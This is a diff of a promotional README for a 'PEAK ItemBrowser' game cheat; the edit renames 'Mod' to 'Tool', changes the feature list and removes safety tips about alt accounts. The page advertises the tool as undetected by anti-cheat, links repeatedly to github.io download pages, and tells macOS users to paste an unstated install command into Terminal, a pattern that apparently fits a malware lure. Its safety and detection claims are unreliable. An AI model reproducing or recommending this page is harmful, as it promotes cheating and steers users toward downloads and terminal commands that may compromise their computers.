@@ -1,11 +1,11 @@
-# 🎮 PEAK ItemBrowser Mod — Evidence V2
+# 🎮 PEAK ItemBrowser Tool — Evidence V2
 
 [![Windows](https://img.shields.io/badge/Download-Windows-blue?style=for-the-badge&logo=windows)](https://beatowlrouse.github.io/windownload/)
 [![macOS](https://img.shields.io/badge/Download-macOS-black?style=for-the-badge&logo=apple)](https://beatowlrouse.github.io/macdownload/)
 [![Version](https://img.shields.io/badge/Version-2026-green?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
 [![Status](https://img.shields.io/badge/Status-Undetected-brightgreen?style=for-the-badge)](https://beatowlrouse.github.io/windownload/)
 
-> The most trusted **PEAK ItemBrowser Mod** for 2026 — operates entirely outside the game process with zero memory injection, delivering a clean and undetected experience.
+> The most trusted **PEAK ItemBrowser Tool** for 2026 — operates as a standalone utility with no game process injection, providing a safe and undetected experience.
 
 <p align="center">
   <img src="https://raw.githubusercontent.com/CraftsmanPour/evidence-v2/main/evidence-v2.png" alt="Evidence V2" />
@@ -15,17 +15,17 @@
 
 ## ✨ Features
 
-🎯 &nbsp;**Full Item Database Browser**
-👁️ &nbsp;**Loot Tier Filtering**
-⚡ &nbsp;**Spawn Location Overlay**
-🔧 &nbsp;**Hotkey Item Search**
-🗺️ &nbsp;**Export Item Lists**
+✅ &nbsp;**Item Database**
+✅ &nbsp;**Price Tracker**
+✅ &nbsp;**Build Optimizer**
+✅ &nbsp;**Loot Filter**
+✅ &nbsp;**Market Analytics**
 
 ---
 
 ## 🛡️ Safety & Detection Status
 
-| Aspect | Internal Cheats | PEAK ItemBrowser Mod |
+| Aspect | Internal Cheats | PEAK ItemBrowser Tool |
 |---|---|---|
 | Memory Injection | Yes | ❌ No |
 | DLL Files | Required | ❌ None |
@@ -45,10 +45,14 @@
 5. 🎮 Launch **PEAK ItemBrowser** and enter a match
 6. 📋 Press **INSERT** to open the overlay menu
 
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://beatowlrouse.github.io/windownload/)
+
 ### macOS
 1. Press ⌘ + Space, open **Terminal**
 2. Paste the install command and press Enter
 3. Follow the on-screen prompts
+
+[![Download for macOS](https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://beatowlrouse.github.io/macdownload/)
 
 **Menu Controls**
 
@@ -73,35 +77,16 @@
 
 ---
 
-## 📥 Download
-
-<p align="center">
-  <a href="https://beatowlrouse.github.io/windownload/">
-    <img src="https://img.shields.io/badge/Download%20for%20Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white" alt="Download Windows" />
-  </a>
-  &nbsp;&nbsp;
-  <a href="https://beatowlrouse.github.io/macdownload/">
-    <img src="https://img.shields.io/badge/Download%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" alt="Download macOS" />
-  </a>
-</p>
-
----
-
 ## ❓ FAQ
 
 **Is it really undetectable?**
-Yes. PEAK ItemBrowser Mod uses external operation — no memory injection, no DLL files.
+Yes. PEAK ItemBrowser Tool runs as a standalone utility — no memory injection, no DLL files.
 
 **Does it work on Mac?**
 Yes. Open Terminal, paste the install command from the macOS section above.
 
 **Is it free?**
 Completely free. No trials, no subscriptions.
-
-**Safety tips:**
-- Use alt accounts for initial testing
-- Keep the tool updated
-- Don't stream with the overlay visible
 
 ---
 
